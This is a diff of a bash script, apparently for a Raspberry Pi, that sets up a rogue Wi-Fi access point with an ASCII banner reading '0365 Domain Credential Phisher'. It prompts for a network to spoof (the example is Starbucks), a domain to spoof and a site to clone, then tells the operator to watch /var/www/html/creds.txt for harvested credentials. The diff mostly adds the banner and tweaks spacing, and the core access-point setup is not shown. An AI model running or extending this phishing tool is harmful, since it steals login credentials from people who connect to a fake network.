@@ -1,23 +1,35 @@
 #!/bin/bash/
+cat >> "EOF"
+   ___ ____    __ _____   _____                        _                               
+  / _ \___ \  / /| ____| |  __ \                      (_)                              
+ | | | |__) |/ /_| |__   | |  | | ___  _ __ ___   __ _ _ _ __                          
+ | | | |__ <| '_ \___ \  | |  | |/ _ \| '_ ` _ \ / _` | | '_ \                         
+ | |_| |__) | (_) |__) | | |__| | (_) | | | | | | (_| | | | | |                        
+  \___/____/ \___/____/  |_____/ \___/|_| |_| |_|\__,_|_|_| |_|                        
+   _____              _            _   _       _   _____  _     _     _                
+  / ____|            | |          | | (_)     | | |  __ \| |   (_)   | |               
+ | |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | | |__) | |__  _ ___| |__   ___ _ __  
+ | |    | '__/ _ \/ _` |/ _ \ '_ \| __| |/ _` | | |  ___/| '_ \| / __| '_ \ / _ \ '__| 
+ | |____| | |  __/ (_| |  __/ | | | |_| | (_| | | | |    | | | | \__ \ | | |  __/ |    
+  \_____|_|  \___|\__,_|\___|_| |_|\__|_|\__,_|_| |_|    |_| |_|_|___/_| |_|\___|_|    
+EOF
+echo ""
 echo -e ${green}"Which interface do you want to use as your AP NIC? Example: wlan1"${clear}
 echo ""
 read AP
-echo""
+sleep 1
 echo -e ${yellow}"Using $AP as your AP interface"${clear}
 echo ""
-sleep 1
 echo -e ${green}"What is the Wifi network you want to spoof? Example: Starbucks Corporate Wifi"${clear}
 echo ""
 read SSID
 sleep 1
-echo ""
 echo -e ${yellow}"Using $SSID as your spoofed network"${clear}
 sleep 1
 echo ""
 echo -e ${green}"What is the domain you want to spoof on your network? Example: starbucks.com"${clear}
 echo ""
 read domain
-echo ""
 sleep 1
 echo -e ${yellow}"Using $domain as your spoofed domain"${clear}
 sleep 1
@@ -25,7 +37,6 @@ echo ""
 echo -e ${green}"Enter Website URL To Clone. Example: https://www.starbucks.com"${clear}
 echo ""
 read URL
-echo ""
 echo -e ${yellow}"Cloning $URL"${clear}
 echo ""
 systemctl stop dnsmasq
@@ -34,6 +45,7 @@ runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/us
 echo ""
 echo ${yellow}"Cloning finished"${clear}
 echo ""
+sleep 1
 echo -e ${yellow}"$URL Cloned Successfully"${clear}
 sleep 2
 
@@ -110,5 +122,3 @@ sleep 4
 echo ""
 echo -e ${red}"Access Point Should Be Up. Watch /var/www/html/creds.txt For Creds"${clear}
 echo ""
-sleep 2
-
